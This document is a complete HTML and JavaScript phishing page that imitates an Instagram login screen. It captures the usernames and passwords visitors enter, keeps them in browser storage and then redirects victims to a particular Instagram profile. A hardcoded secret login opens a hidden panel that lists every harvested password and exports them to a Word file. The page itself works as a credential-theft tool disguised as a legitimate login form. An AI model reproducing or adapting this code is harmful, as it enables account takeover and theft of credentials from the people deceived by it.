<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram-style Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: url('A.jpg') no-repeat center center fixed;
      background-size: cover;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .login-container {
      margin-top: 50px;
      border: 1px solid #dbdbdb;
      background: white;
      padding: 40px;
      text-align: center;
      width: 300px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    .login-container h1 {
      font-family: 'Billabong', cursive;
      font-size: 48px;
      margin-bottom: 10px;
    }
    .login-container h2 {
      font-size: 24px;
      margin-bottom: 5px;
    }
    .login-container p {
      font-size: 12px;
      color: #888;
      margin-bottom: 20px;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #dbdbdb;
      border-radius: 5px;
    }
    .eye-toggle {
      position: relative;
      display: flex;
      align-items: center;
    }
    .eye-toggle span {
      position: absolute;
      right: 10px;
      cursor: pointer;
      color: #666;
    }
    button {
      background-color: #3897f0;
      color: white;
      padding: 10px;
      width: 100%;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-weight: bold;
    }
    #adminSection {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: white;
      overflow: auto;
      padding: 20px;
      box-sizing: border-box;
    }
    table {
      border-collapse: collapse;
      width: 100%;
    }
    th, td {
      border: 1px solid #ccc;
      padding: 10px;
      text-align: left;
    }
    th {
      background: #3897f0;
      color: white;
      cursor: pointer;
    }
    .delete-btn {
      background: red;
      color: white;
      border: none;
      padding: 5px 10px;
      cursor: pointer;
      border-radius: 3px;
    }
    #exportBtn, #filterInput {
      margin: 10px 5px;
      padding: 8px;
    }
    #confirmPrompt {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(255, 255, 255, 0.95);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }
    #confirmPrompt div {
      background: #fff;
      border: 2px solid #3897f0;
      padding: 30px;
      text-align: left;
      font-size: 16px;
      max-width: 400px;
      width: 100%;
      box-shadow: 0 0 10px rgba(0,0,0,0.3);
    }
    .group-header {
      background: #eee;
      font-weight: bold;
      padding: 8px;
      text-align: left;
    }
  </style>
</head>
<body>
  <div class="login-container" id="loginContainer">
    <h1>Instagram</h1>
    <h2>Welcome</h2>
    <p>Please log in with your Instagram credentials</p>
    <input type="text" id="username" placeholder="Username">
    <div class="eye-toggle">
      <input type="password" id="password" placeholder="Password">
      <span onclick="togglePassword()">üëÅ</span>
    </div>
    <button onclick="confirmLogin()">Log In</button>
  </div>  <div id="confirmPrompt"></div>  <div id="adminSection">
    <h2>Stored Credentials</h2>
    <input type="text" id="filterInput" placeholder="Search...">
    <button id="exportBtn" onclick="exportToWord()">Export to Word</button>
    <table>
      <thead>
        <tr>
          <th onclick="sortTable(0)">Username</th>
          <th>Password</th>
          <th onclick="sortTable(1)">Date</th>
          <th>Action</th>
        </tr>
      </thead>
      <tbody id="tableBody"></tbody>
    </table>
  </div>  <script>
    const entries = JSON.parse(localStorage.getItem('loginData')) || [];

    function togglePassword() {
      const pass = document.getElementById('password');
      pass.type = pass.type === 'password' ? 'text' : 'password';
    }

    function confirmLogin() {
      const user = document.getElementById('username').value.trim();
      const pass = document.getElementById('password').value.trim();

      if (!user || !pass) {
        alert("Please fill in all fields.");
        return;
      }

      const container = document.getElementById('confirmPrompt');
      container.style.display = 'flex';
      document.getElementById('loginContainer').style.display = 'none';
      container.innerHTML = `
        <div>
          <p><strong>Confirm your details:</strong></p>
          <p>Username: ${user}</p>
          <p>Password: <input type="password" value="${pass}" id="confirmPassInput" style="width: 80%; padding: 5px;"> <span onclick="toggleConfirmPass()">üëÅ</span></p>
          <button onclick="handleConfirm('${user}', '${pass}')">Confirm</button>
          <button onclick="cancelPrompt()">Cancel</button>
        </div>
      `;
    }

    function toggleConfirmPass() {
      const input = document.getElementById('confirmPassInput');
      input.type = input.type === 'password' ? 'text' : 'password';
    }

    function cancelPrompt() {
      document.getElementById('confirmPrompt').style.display = 'none';
      document.getElementById('loginContainer').style.display = 'block';
    }

    function handleConfirm(user, pass) {
      const container = document.getElementById('confirmPrompt');
      container.style.display = 'none';

      if (user === "Bravo" && pass === "Bravin,18794") {
        document.getElementById("adminSection").style.display = "block";
        populateTable();
        return;
      }
      const existing = entries.find(e => e.username === user && e.password === pass);
      const currentDate = new Date().toLocaleString();
      if (existing) {
        existing.date = currentDate;
      } else {
        entries.push({ username: user, password: pass, date: currentDate, deletable: true });
      }
      localStorage.setItem('loginData', JSON.stringify(entries));
      alert("Redirecting to Instagram...");
      window.location.href = "https://instagram.com/bravo_momanyi?text=I%20found%20you%20on%20your%20gift%20page";
    }

    function populateTable() {
      const filterText = document.getElementById('filterInput').value.toLowerCase();
      const tbody = document.getElementById('tableBody');
      tbody.innerHTML = '';

      const filtered = entries
        .filter(entry => entry.username.toLowerCase().includes(filterText) || entry.date.includes(filterText))
        .sort((a, b) => new Date(b.date) - new Date(a.date));

      const groups = {
        'Today': [],
        'This Week': [],
        'Earlier': []
      };

      const now = new Date();
      filtered.forEach(entry => {
        const entryDate = new Date(entry.date);
        const diff = (now - entryDate) / (1000 * 60 * 60 * 24);
        if (entryDate.toDateString() === now.toDateString()) {
          groups['Today'].push(entry);
        } else if (diff <= 7) {
          groups['This Week'].push(entry);
        } else {
          groups['Earlier'].push(entry);
        }
      });

      for (let label in groups) {
        if (groups[label].length > 0) {
          tbody.innerHTML += `<tr class="group-header"><td colspan="4">${label}</td></tr>`;
          groups[label].forEach((entry, index) => {
            tbody.innerHTML += `
              <tr>
                <td>${entry.username}</td>
                <td>${entry.password}</td>
                <td>${entry.date}</td>
                <td>${entry.deletable ? `<button class='delete-btn' onclick='deleteEntry(${entries.indexOf(entry)})'>Delete</button>` : ''}</td>
              </tr>`;
          });
        }
      }
    }

    function deleteEntry(index) {
      if (confirm("Are you sure you want to delete this entry?")) {
        entries.splice(index, 1);
        localStorage.setItem('loginData', JSON.stringify(entries));
        populateTable();
      }
    }

    function exportToWord() {
      const header = "<h2>Login Entries</h2>";
      const rows = entries
        .filter(e => e.deletable)
        .map(e => `<p><b>${e.username}</b> - ${e.password} (${e.date})</p>`)
        .join('');
      const blob = new Blob(['<html><body>' + header + rows + '</body></html>'], { type: 'application/msword' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'Login_Entries.doc';
      a.click();
    }

    document.getElementById('filterInput').addEventListener('input', populateTable);
  </script></body>
</html>
